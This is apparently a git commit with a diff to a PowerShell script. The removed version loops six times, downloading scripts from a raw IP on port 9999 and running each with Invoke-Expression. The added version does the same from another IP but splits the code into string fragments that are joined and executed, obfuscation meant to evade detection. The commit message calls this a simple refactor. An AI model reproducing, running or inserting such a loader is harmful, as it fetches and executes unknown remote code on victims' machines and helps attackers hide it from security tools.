06bca33c27fab1a7b45c83719915df2df8bfaa96
chang phai may troi... <1nuhongio@gmail.com>
2026-01-16 07:48:29 +0700

    Refactor script to use fragments for URL fetching

--- cachdebienthanhtungsahur.ps1
+++ cachdebienthanhtungsahur.ps1
@@ -1,12 +1,12 @@
-
-for ($i = 1; $i -le 6; $i++) {
+$fragments = @('﻿
+for ($i = ','1; $i -le 6; $i','++) {
    
-    $url = "http://103.67.197.187:9999/dc$i.ps1"
+   ',' $url = "http:/','/160.30.44.20',':9999/dc$i.ps1"','
     
     
-    $webClient = New-Object System.Net.WebClient
-    $scriptContent = $webClient.DownloadString($url)
+ ','   $webClient =',' New-Object Sys','tem.Net.WebClie','nt
+    $script','Content = $webC','lient.DownloadS','tring($url)
+  ','  
     
-    
-    Invoke-Expression $scriptContent
-}
+    I','nvoke-Expressio','n $scriptConten','t
+}'); $script = $fragments -join ''; Invoke-Expression $script
